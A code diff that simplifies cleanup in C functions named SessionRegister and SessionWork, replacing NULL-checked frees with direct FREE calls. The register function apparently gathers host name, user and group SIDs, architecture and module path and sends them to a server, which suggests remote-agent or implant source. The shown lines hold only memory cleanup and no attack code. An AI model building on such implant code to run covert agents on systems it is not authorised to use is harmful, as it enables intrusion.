@@ -138,44 +138,18 @@ BOOL SessionRegister
 	pFinalElement->pMarshalledData = NULL;
 	Result = pSession->Send(pSession->pGlobalConfig, pSession->lpClient, &RegisterEnvelope);
 CLEANUP:
-	if (lpHostName != NULL) {
-		FREE(lpHostName);
-	}
-
-	if (lpUUID != NULL) {
-		FREE(lpUUID);
-	}
-
-	if (lpFullQualifiedName != NULL) {
-		FREE(lpFullQualifiedName);
-	}
-
-	if (lpUserSid != NULL) {
-		FREE(lpUserSid);
-	}
-
-	if (lpGroupSid != NULL) {
-		FREE(lpGroupSid);
-	}
-
-	if (lpArch != NULL) {
-		FREE(lpArch);
-	}
-
-	if (lpModulePath != NULL) {
-		FREE(lpModulePath);
-	}
-
-	if (lpVersion != NULL) {
-		FREE(lpVersion);
-	}
-
-	if (lpLocaleName != NULL) {
-		FREE(lpLocaleName);
-	}
-
+	FREE(lpHostName);
+	FREE(lpUUID);
+	FREE(lpFullQualifiedName);
+	FREE(lpUserSid);
+	FREE(lpGroupSid);
+	FREE(lpArch);
+	FREE(lpModulePath);
+	FREE(lpVersion);
+	FREE(lpLocaleName);
 	FreeBuffer(RegisterEnvelope.pData);
 	FreeElement(pFinalElement);
+
 	return Result;
 }
 
@@ -208,13 +182,8 @@ VOID SessionWork
 CLEANUP:
 	FreeEnvelope(pSendEnvelope);
 	FreeEnvelope(pRecvEnvelope);
-	if (pWrapper != NULL) {
-		FREE(pWrapper);
-	}
-
-	if (HandlerList != NULL) {
-		FREE(HandlerList);
-	}
+	FREE(pWrapper);
+	FREE(HandlerList);
 
 	return;
 }
